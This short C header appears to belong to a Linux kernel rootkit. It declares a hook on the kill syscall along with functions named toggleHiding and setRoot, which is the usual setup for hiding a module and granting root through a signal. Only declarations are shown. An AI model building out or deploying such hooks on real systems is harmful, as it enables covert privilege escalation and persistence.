#include "../common.h"

int toggleHiding(void);
int setRoot(void);

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*killOG)(const struct pt_regs *);
asmlinkage int killHook(const struct pt_regs *regs);
#else
static asmlinkage long (*killOG)(pid_t pid, int sig);
asmlinkage int killHook(pid_t pid, int sig);
#endif
